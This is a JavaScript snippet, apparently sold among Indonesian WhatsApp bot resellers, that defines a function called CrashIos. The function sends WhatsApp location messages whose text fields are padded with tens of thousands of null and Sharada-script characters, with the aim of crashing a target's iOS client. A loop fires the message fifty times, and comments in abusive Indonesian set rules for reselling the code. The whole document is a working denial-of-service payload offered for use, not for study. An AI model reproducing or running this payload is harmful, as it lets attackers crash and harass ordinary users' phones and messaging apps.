/* 
Function Forclose Create By @GyzenVtx Khusus Patner
Rules :
? Reseller Function No Jual Function
? Pt Function Bebas Jual Asal Harga Ga Mines
? No Share Function Ke Own/Tk/PT Lu
? No Sebar Function Secara Free
Melanggar? Gw Bl + Kick Lu Bangsat
*/

async function CrashIos(sock, target) {
 
    await sock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: " ‼️⃟𝕾𝖓𝒊𝖙̦̾𝖍? ҉҈⃝⃞⃟⃠⃤꙰꙲꙱\n" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(60000),
          url: "https://t.me/GyzenVtx",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  }        

 //Penggunaan/Panggilan
 for (let s = 0; s < 50; i++) {
await CrashIos(stx, Fjids);
await sleep(1000);
}

/*
 JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
*/